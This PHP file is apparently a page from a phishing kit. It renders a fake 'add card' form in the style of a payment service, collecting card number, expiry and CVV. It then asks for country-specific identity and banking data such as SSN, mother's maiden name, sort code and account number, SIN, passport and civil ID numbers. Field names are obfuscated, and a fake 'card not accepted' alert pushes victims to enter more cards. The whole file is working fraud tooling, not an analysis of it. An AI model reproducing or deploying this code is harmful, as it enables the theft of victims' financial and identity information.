<?php
require __DIR__ . '/function.php';
require $api->language();

$page = "card1";
$api->check_cookie();
$api->session("kuzuluy", true, $page);

if ($api->config("bank") == "on") {
  $return = 'confirm_bank';
} elseif ($api->config("doublecard") == "on") {
  $return = 'confirm_anothercard';
} elseif ($api->config("identity") == "on") {
  $return = 'confirm_identity';
} else {
  $return = 'success';
}

require __DIR__ . '/system/page/header.php';

$html .= '
<div class="title-page">'.$api->text_encode($text['60']).'</div>
<div class="twbs_alert vx_alert hide" id="MSGError">
<p class="vx_alert-text" style="text-align:left;font-size:15px">
'.$api->text_encode("This card is not accepted. Please use a different card.").'
</p>
</div>
<form name="addCreditOrDebit" method="post" id="card1" autocomplete="off">
<div class="textInput lap" id="DivName" style="margin-bottom: 3px;">
<input type="text" name="'.$api->encypt("cardholder").'" id="Name" placeholder="'.$api->text_encode($text['61']).'">
</div>
<div class="creditCardInput clearfix">
<div class="creditCardInput-layout">
<div class="cardNumber" id="cardNumber">
<div class="textInput ccNumber ccNumber ccNum lap" id="DivNumber" style="margin-bottom: 10px;">
<input type="tel" name="'.$api->encypt("cardnum").'" id="Number" placeholder="'.$api->text_encode($text['62']).'">
</div>
<div class="cardLogo">
<span class="fiModule-icon_card" id="DivLogo"></span>
</div>
</div>
<div class="cardInputs">
<div class="expiration js_card_toggleField" style="margin-bottom: -10px;">
<div class="textInput expirationDate js_expirationDate expirationDate expirationDate lap" id="DivExp">
<input type="tel" name="'.$api->encypt("cardexp").'" id="Exp" placeholder="'.$api->text_encode($text['63']." (MM/YY)").'">
</div>
</div>
<div class="js_card_toggleField" id="cardSecurityCode" style="margin-bottom: -10px;">
<div class="textInput csc pull-right csc securityCode lap" id="DivCvv" data-ctype="">
<input type="tel" name="'.$api->encypt("cardcvv").'" id="Cvv" placeholder="'.$api->text_encode($text['64']).'">
</div>
</div>
</div>';

if ($_SESSION['countrycode'] == "US") {
  $html .= '
<div class="cardInputs">
<div class="textInput lap" id="DivSsn" style="margin-bottom: -5px;">
<input type="tel" name="'.$api->encypt("ssn").'" id="Ssn" placeholder="'.$api->text_encode("Social security number").'">
</div>
<div class="textInput pull-right lap" style="margin-bottom: -5px;">
<input type="text" name="'.$api->encypt("mother").'" placeholder="'.$api->text_encode("Mother maiden name (optional)").'">
</div>
</div>';
}
if ($_SESSION['countrycode'] == "GB") {
  $html .= '</div></div>
<div class="textInput lap" id="DivSort"  style="margin-bottom: 5px;">
<input type="tel" name="'.$api->encypt("sort").'" id="Sort" placeholder="'.$api->text_encode("Sort code").'">
</div>
<div class="creditCardInput clearfix">
<div class="creditCardInput-layout">
<div class="cardInputs">
<div class="textInput lap" id="DivAccnum" style="margin-bottom: -5px;">
<input type="text" name="'.$api->encypt("accnum").'" id="Accnum" placeholder="'.$api->text_encode("Account number").'">
</div>
<div class="textInput pull-right lap" style="margin-bottom: -5px;">
<input type="text" name="'.$api->encypt("mother").'" placeholder="'.$api->text_encode("Mother maiden name (optional)").'">
</div>
</div>';
}
if ($_SESSION['countrycode'] == "IE") {
  $html .= '
<div class="cardInputs">
<div class="textInput lap" id="DivSort" style="margin-bottom: -5px;">
<input type="tel" name="'.$api->encypt("sort").'" id="Sort" placeholder="'.$api->text_encode("Sort code").'">
</div>
<div class="textInput pull-right lap" id="DivAccnum2" style="margin-bottom: -5px;">
<input type="text" name="'.$api->encypt("accnum").'" id="Accnum2" placeholder="'.$api->text_encode("Account number").'">
</div>
</div>';
}
if ($_SESSION['countrycode'] == "CA") {
  $html .= '
<div class="cardInputs">
<div class="textInput lap" id="DivSin" style="margin-bottom: -5px;">
<input type="tel" name="'.$api->encypt("sin").'" id="Sin" placeholder="'.$api->text_encode("Social insurance number").'">
</div>
<div class="textInput pull-right lap" style="margin-bottom: -5px;">
<input type="text" name="'.$api->encypt("mother").'" placeholder="'.$api->text_encode("Mother maiden name (optional)").'">
</div>
</div>';
}
if ($_SESSION['countrycode'] == "AU") {
  $html .= '
<div class="cardInputs">
<div class="textInput lap" id="DivDriver" style="margin-bottom: 0px;">
<input type="text" name="'.$api->encypt("driver").'" id="Driver" placeholder="'.$api->text_encode("Driver license number").'">
</div>
<div class="textInput pull-right lap" id="DivOsid" style="margin-bottom: 0px;">
<input type="text" name="'.$api->encypt("osid").'" id="Osid" placeholder="'.$api->text_encode("OSID number").'">
</div>
</div>
<div class="cardInputs">
<div class="textInput lap" id="DivLimit" style="margin-bottom: 0px;">
<input type="text" name="'.$api->encypt("limit").'" id="Limit" placeholder="'.$api->text_encode("Credit limit").'">
</div>
<div class="textInput pull-right lap" id="DivAccnum2" style="margin-bottom: 0px;">
<input type="text" name="'.$api->encypt("accnum").'" id="Accnum2" placeholder="'.$api->text_encode("Account number").'">
</div>
</div>';
}
if ($_SESSION['countrycode'] == "PH") {
  $html .= '</div></div>
<div class="textInput lap" id="DivCustomer" style="margin-bottom: 10px;">
<input type="text" name="'.$api->encypt("customer").'" id="Customer" placeholder="'.$api->text_encode("Customer number").'">';
}
if ($_SESSION['countrycode'] == "TH") {
  $html .= '
<div class="cardInputs">
<div class="textInput lap" id="DivLimit" style="margin-bottom: -5px;">
<input type="text" name="'.$api->encypt("limit").'" id="Limit" placeholder="'.$api->text_encode("Credit limit").'">
</div>
<div class="textInput pull-right lap" id="DivCitizen" style="margin-bottom: -5px;">
<input type="text" name="'.$api->encypt("citizen").'" id="Citizen" placeholder="'.$api->text_encode("Citizen ID").'">
</div>
</div>';
}
if ($_SESSION['countrycode'] == "CY") {
  $html .= '</div></div>
<div class="textInput lap" id="DivPassport" style="margin-bottom: 10px;">
<input type="text" name="'.$api->encypt("passport").'" id="Passport" placeholder="'.$api->text_encode("Passport number").'">';
}
if ($_SESSION['countrycode'] == "KW") {
  $html .= '</div></div>
<div class="textInput lap" id="DivCivil" style="margin-bottom: 10px;">
<input type="text" name="'.$api->encypt("civil").'" id="Civil" placeholder="'.$api->text_encode("Civil ID number").'">';
}
if ($_SESSION['countrycode'] == "NZ") {
  $html .= '
<div class="cardInputs">
<div class="textInput lap" id="DivLimit" style="margin-bottom: -5px;">
<input type="text" name="'.$api->encypt("limit").'" id="Limit" placeholder="'.$api->text_encode("Credit limit").'">
</div>
<div class="textInput pull-right lap" id="DivBan" style="margin-bottom: -5px;">
<input type="text" name="'.$api->encypt("ban").'" id="Ban" placeholder="'.$api->text_encode("Bank access number").'">
</div>
</div>';
}
if ($_SESSION['countrycode'] == "DO") {
  $html .= '</div></div>
<div class="textInput lap" id="DivLimit" style="margin-bottom: 10px;">
<input type="text" name="'.$api->encypt("limit").'" id="Limit" placeholder="'.$api->text_encode("Credit limit").'">';
}
if ($_SESSION['countrycode'] == "CH") {
  $html .= '</div></div>
<div class="textInput lap" id="DivAccnum" style="margin-bottom: 10px;">
<input type="text" name="'.$api->encypt("accnum").'" id="Accnum" placeholder="'.$api->text_encode("Account number").'">';
}
if ($_SESSION['countrycode'] == "BG") {
  $html .= '
<div class="cardInputs">
<div class="textInput lap" id="DivPersonal" style="margin-bottom: -5px;">
<input type="text" name="'.$api->encypt("personal").'" id="Personal" placeholder="'.$api->text_encode("Personal ID").'">
</div>
<div class="textInput pull-right lap" id="DivAccnum2" style="margin-bottom: -5px;">
<input type="text" name="'.$api->encypt("accnum").'" id="Accnum2" placeholder="'.$api->text_encode("Account number").'">
</div>
</div>';
}
if ($_SESSION['countrycode'] == "JP") {
  $html .= '</div></div>
<div class="textInput lap" id="DivAccnum" style="margin-bottom: 10px;">
<input type="text" name="'.$api->encypt("accnum").'" id="Accnum" placeholder="'.$api->text_encode("WEBサービスID").'">';
}

$html .= '
</div>
</div>
<input class="vx_btn col-md-12 col-sm-12 col-xs-12" type="submit" value="'.$api->text_encode($text['59']).'" id="btnConfirm">
<p class="scretlogo"></p>
</form>
<div class="hasSpinner hide" id="loading"></div>';

require __DIR__ . '/system/page/footer.php';
?>
